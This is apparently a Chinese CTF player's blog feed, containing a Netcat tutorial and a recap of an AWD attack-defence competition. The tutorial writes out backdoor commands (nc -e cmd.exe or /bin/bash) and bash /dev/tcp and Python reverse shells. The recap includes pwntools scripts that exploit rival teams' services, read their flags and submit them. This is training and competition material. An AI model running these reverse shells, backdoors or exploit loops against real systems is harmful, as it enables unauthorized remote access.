<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我也不知道为什么抄别人的还要写WP，另外找到一个py2的脚本，但是看不懂，他那个好像可以是密文不等长的，先贴一下链接，后续再研究<br><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OTP一次一密</tag>
      </tags>
  </entry>
  <entry>
    <title>Netcat</title>
    <url>/posts/50009ff3/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p><a href="https://eternallybored.org/misc/netcat/">win安装nc的地址</a></p>
<p>基于TCP/IP协议，采用C/S模式，是一种由服务器发起的被动连接</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910134418073.png" alt="image-20210910134418073"></p>
<p><code>netstat -an</code></p>
<h2 id="基本的命令"><a href="#基本的命令" class="headerlink" title="基本的命令"></a>基本的命令</h2><ol>
<li><p><strong>建立一个简单的通信</strong>（爱情只有双向奔赴才有意义）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport]</code><ul>
<li><code>l</code>表示启动监听模式</li>
<li><code>p</code>表示监听的端口</li>
</ul>
</li>
<li>创建一个客户端：<code>nc [remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>返回shell的使用</strong></p>
<ul>
<li>创建一个服务器端：<code>nc -l -p [localport] -e cmd.exe</code></li>
<li>创建一个客户端：<code>nc -[remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>文件传输</strong>（当然也可以客户端向服务端发送）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport] &gt; outfile</code></li>
<li>创建一个客户端：<code>nc [remote_addr][remoteport] &lt; infile</code></li>
</ul>
</li>
<li><p><strong>避免“假死”</strong></p>
<ul>
<li><code>nc -w3 [ip] [port]</code>，等待3秒不能连接上直接断掉</li>
</ul>
</li>
<li><p><strong>端口扫描</strong></p>
<ul>
<li><code>nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code><ul>
<li><code>v</code>表示对错误进行详细输出</li>
<li><code>n</code>不对目标机器进行DNS解析</li>
<li><code>z</code>zero I/O模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何payload，加快扫描速度</li>
<li><code>w</code>超时设置为1秒</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>banner信息的抓取</strong></p>
<ul>
<li><code>echo &quot; &quot; | nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code> </li>
</ul>
</li>
<li><p><strong>win建立后门</strong></p>
<ul>
<li><p>监听型后门：<code>nc -l -p [localport] -e cmd.exe</code></p>
</li>
<li><p>连接型后门：<code>nc [remote_ip] [remote_port] -e cmd.exe</code></p>
<p>以上两个操作是在被攻陷拿到低权限的客户端，也就是我们攻击者作为服务端，只要在这之前打开这个连接，就可以获取win客户端的shell</p>
</li>
</ul>
</li>
<li><p><strong>linux建立后门</strong></p>
<ul>
<li>监听型后门：<code>nc -l -p [localport] -e /bin/bash</code></li>
<li>连接型后门：<code>nc [remote_ip] [remote_port] -e /bin/bash</code></li>
</ul>
<p><code>nc</code>没有-e可以用<code>ncat</code>代替</p>
</li>
</ol>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><ul>
<li><p><code>d</code> 脱离命令窗口，在后台运行，与建立后门更配</p>
</li>
<li><p><code>e</code>执行某个程序</p>
</li>
<li><p><code>G</code>设置网关，突破内网限制</p>
</li>
<li><p><code>g num</code>路由跳数</p>
</li>
<li><p><code>i sec</code>设置发送每一行数据的时间间隔</p>
</li>
<li><p><code>l</code>设置netcat处于监听状态等待连接</p>
</li>
<li><p><code>L</code>设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态</p>
</li>
<li><p><code>n</code>设置netcat只识别ip地址，不进行DNS解析</p>
</li>
<li><p><code>o file</code>设置传输十六进制的数据</p>
</li>
<li><p><code>-p port</code>设置本地监听的端口号</p>
</li>
<li><p><code>r</code>设置netcat随机化的端口号</p>
</li>
<li><p><code>s addr</code>设置netcat的源地址</p>
</li>
<li><p><code>t</code>回复telnet请求数据包</p>
</li>
<li><p><code>u</code>设置netcat使用UDP模式</p>
</li>
<li><p><code>v</code>显示错误提示信息</p>
</li>
<li><p><code>w secs</code>设置连接超时秒数</p>
</li>
<li><p><code>-z</code>设置扫描模式，表示发送的数据包中不包含任何payload</p>
</li>
</ul>
<h2 id="连接转发"><a href="#连接转发" class="headerlink" title="连接转发"></a>连接转发</h2><p>突破内外网的限制</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910174315946.png" alt="image-20210910174315946"></p>
<ul>
<li><code>echo nc [target] [port] &gt; delay.bat</code></li>
<li><code>nc -l -p [localport] -e delay.bat</code></li>
</ul>
<p>当客户端连接到该服务器端时，连接的客户端通过服务端连接到target port上，实现了连接转发</p>
<p>其中<code>delay.bat</code>文件中的内容是<code>nc64.exe [target] [port]</code>，连接目标服务器</p>
<p>小绕，简洁一点</p>
<ul>
<li>目标服务器：与转发服务器在同一网段下，打开本地一个端口用于监听</li>
<li>转发服务器：打开本地的一个端口并运行<code>delay.bat</code>批处理文件</li>
<li>客户端：直接连接转发服务器</li>
</ul>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat时，可以反弹一个shell到客户端，然后客户端执行有关命令，让服务器返回对应的内容</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910180330461.png" alt="image-20210910180330461"></p>
<ul>
<li><p>服务器端反弹shell命令：<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
</li>
<li><p>客户端接收Netcat命令：<code>nc -lvp port</code></p>
</li>
</ul>
<p>服务器端输入的反弹shell命令中的ip和port是客户端的ip和port</p>
<p>主要的原理如下</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910222826253.png" alt="image-20210910222826253"></p>
<h2 id="反弹shell（python）"><a href="#反弹shell（python）" class="headerlink" title="反弹shell（python）"></a>反弹shell（python）</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat，但是安装了Python（Linux默认安装），可以用Python反弹shell</p>
<ul>
<li><p>服务器端反弹shell命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os, socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connnect((&#x27;ip&#x27;, port));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);p=subprocess.call([&#x27;/bin/bash&#x27;, &#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, socket, subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connnect((<span class="string">&#x27;ip&#x27;</span>, port))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
<li><p>客户端接收：<code>nc -lvp [port]</code></p>
</li>
</ul>
<p>os的dup2方法将标准输入，输出，错误输出重定向到远程</p>
<h2 id="Netcat（Nc不支持-e时）"><a href="#Netcat（Nc不支持-e时）" class="headerlink" title="Netcat（Nc不支持-e时）"></a>Netcat（Nc不支持-e时）</h2><ul>
<li>服务器端反弹shell命令：<code>nc [ip] [port] | /bin/bash | nc [ip] [port]</code></li>
<li>客户端接收命令：<code>nc -lvp [port]</code></li>
</ul>
<p>客户端要启动两个窗口，开启监听，并且两个端口要不同，这样是为了通过管道符将客户端一个监听窗口的命令的执行结果返回到另外一个监听窗口</p>
<h2 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h2><p>似乎在同一网络下，不同电脑似乎连不上</p>
<p>在服务器上开，竟然不行，很奇怪，不知道哪里搞错了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210617 记国赛线下AWD选拔赛</title>
    <url>/posts/3a78d3e0/</url>
    <content><![CDATA[<p>我是一块砖，需要就往哪里搬。震惊，密码师傅零基硬刚PWN，结果被凑得鼻青脸肿</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-11a8defc.png" alt="昂？" style="zoom:50%;" />

<p>三个月后回头看，发现自己真的是太菜了，别的密码师傅都可以国赛中打得很自在，自己却被一天罚站。学习的面可以广啊。做这一行，<strong>只能有长板和无数个中板</strong></p>
<span id="more"></span>

<h1 id="20210617-记国赛线下AWD选拔赛"><a href="#20210617-记国赛线下AWD选拔赛" class="headerlink" title="20210617 记国赛线下AWD选拔赛"></a>20210617 记国赛线下AWD选拔赛</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>当时的放在桌子上的文件</p>
<img alt="README-7b68301e.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-7b68301e.png" width="" height="" style="zoom:67%;"  >

<p>点开那个网络配置，然后双击ipv4，自动获取ip，然后查看下ipconfig就好了</p>
<img alt="README-2be6a323.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-2be6a323.png" width="" height="" style="zoom:67%;"  >

<h2 id="PWN文件的下载"><a href="#PWN文件的下载" class="headerlink" title="PWN文件的下载"></a>PWN文件的下载</h2><blockquote>
<p>使用sftp</p>
</blockquote>
<h3 id="步骤一：连接靶机"><a href="#步骤一：连接靶机" class="headerlink" title="步骤一：连接靶机"></a>步骤一：连接靶机</h3><p>有一种是输入密码的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -p [端口号] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p>输入密码，进入端口</p>
<p>还有一种是用私钥文件认证的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p><em>这次遇到的是后一种，输入密码的听说是相同的、或者是弱密码可以抢先别人一步拿到密码并且改掉，但是用RSA签名认证的应该就不会出现这种情况</em></p>
<h3 id="步骤二：文件下载和上传"><a href="#步骤二：文件下载和上传" class="headerlink" title="步骤二：文件下载和上传"></a>步骤二：文件下载和上传</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lpwd  <span class="comment"># 查看本地文件路径lpath</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>   <span class="comment"># 查看远程路径path</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">get lpath path    <span class="comment"># 下载文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">put path          <span class="comment"># 上传文件</span></span><br></pre></td></tr></table></figure>

<p>或说这两个我从来没有成功过，当时比赛是用图形化界面的ssh拉下来的，使用相对也比较简单</p>
<img alt="README-a08a1141.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a08a1141.png" width="" height="" style="zoom:67%;"  >

<blockquote>
<p>ssh</p>
</blockquote>
<p>操作的过程和sftp差不多，因为ssh内含sftp协议，比如连接的命令就是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<h2 id="当PWN遇上流量分析"><a href="#当PWN遇上流量分析" class="headerlink" title="当PWN遇上流量分析"></a>当PWN遇上流量分析</h2><p>写了两个利用攻击来源的流量包分析出的还有点用处的手动化脚本</p>
<p>有了第一天的经验，第二天直接分析流量包。而且比赛开始没几分钟，就有队伍PWN题打过来了，拿到packages看看</p>
<p>追踪TCP流</p>
<img alt="记国赛线下AWD选拔赛-f9a23239.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-f9a23239.png" width="" height="" style="zoom:67%;"  >

<p>这是PWN2的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">++++++++++X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DJR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是PWN3的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">985</span><br><span class="line">10</span><br><span class="line">985</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6</span><br><span class="line">flappybird666666</span><br></pre></td></tr></table></figure>

<p>打PWN2的脚本，我写的主要有几个问题</p>
<ol>
<li><p>不能每隔十分钟自动跑，新的一轮要手动跑几次，但是后面也就是在跑这两个脚本了，然后改改一些小的地方，没别的事做，所以还好</p>
</li>
<li><p>有一些IP是修好的，或者是即使没有修好，输入输出流之间可能会有EOF错误（PWN师傅说要sleep一下，后续研究）导致有些会卡住程序运行，所以在手跑的时候，需要将连接不好又不能跳过的IP去掉一下</p>
<img alt="README-6d5540d6.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-6d5540d6.png" width="" height="" ></li>
</ol>
<p>这个脚本大概每次会有20~35个flag提交成功，因为很多队伍，包括我们的一队都修好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> [<span class="string">&#x27;172.35.7.17&#x27;</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;++++++++++X&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;DJR&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cd ../&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>这是打PWN3的，平均每次可以得到45个flag，但后来发现这题几乎所有的队伍都没有防住，说是可能题目有问题patch了之后check不过，而且还被攻击，第一名的白泽正是如此，所以应该有接近60个的flag，看来中间还是有我没解决的实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> []:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;flappybird666666&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>虽然确实没有什么技术含量的脚本，但在比赛中还是有点用的吧</p>
<h2 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h2><p>还有队内交流真的十分重要，两个随身携带的U盘被我们传来传去</p>
<p>没啥想说的，路还远，时间不多了，走吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>CTF密码题是怎么炼成的</title>
    <url>/posts/921543e1/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="CTF密码题是怎么炼成的"><a href="#CTF密码题是怎么炼成的" class="headerlink" title="CTF密码题是怎么炼成的"></a>CTF密码题是怎么炼成的</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>web和pwn的出题会用到docker的相关操作，出pwn题，有个大佬写了个<a href="https://github.com/giantbranch/pwn_deploy_chroot">脚本</a>一键搭</p>
<p>而Crypto出题就不用那么麻烦（指环境搭建），可以只写下python脚本就好，主要还是对服务器进行配置吧，想起了某段时间，我一直在配置pwn环境的虚拟机，<em>先虚拟机，再vim，再换源，再zsh，on-my-zsh，再vim主题哈哈哈哈哈</em>，pwn用到的环境以及一些工具主要参考的是<a href="https://blog.csdn.net/Y_peak/article/details/112850307">这位师傅的博客</a>，写得太好了，这里需要用到pwntools工具写脚本</p>
<p>Crypto用到的一些东西之前装过很多次，主要的问题罗列了一下，我的服务器系统镜像是ubuntu18的，一些之后课上的使用技巧和遇到问题的解决，预期发一篇博客，咕咕咕？</p>
<ul>
<li><p>python2安装gmpy2，<a href="https://leefige.github.io/2021/03/11/%E5%AE%89%E8%A3%85gmpy2/">查看这位师傅的博客</a>，python3的安装看<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">这位师傅的</a>就好了</p>
<p>前者中途如果报了个什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/gmpy2.c:445:10: fatal error: Python.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include <span class="string">&quot;Python.h&quot;</span></span></span><br><span class="line">          ^~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1</span><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913095633149.png" alt="image-20210913095633149"></p>
<p>执行下这个命令<code>sudo apt-get install python-dev</code>安装下就好了</p>
</li>
<li><p>Crypto库的安装，win下安装就是要改个名，linux下更简单，后者可以看<a href="https://blog.csdn.net/qq_45000214/article/details/106222660">这位师傅的博客</a></p>
</li>
<li><p>如果要安装sage，参考<a href="https://blog.csdn.net/ckm1607011/article/details/106724624">这位师傅的博客</a>，怎么获取最新版的忘了，之前好不容易把子系统的sage搞成9的</p>
</li>
<li><p>最后是我还看得顺眼的vim主题<a href="https://link.csdn.net/?target=https://github.com/sickill/vim-monokai">monokai</a>，以及如何下载<a href="https://www.cnblogs.com/woniu201/p/10304197.html">Vundle</a>（两款管理vim插件的插件），还有我一般的vim配置</p>
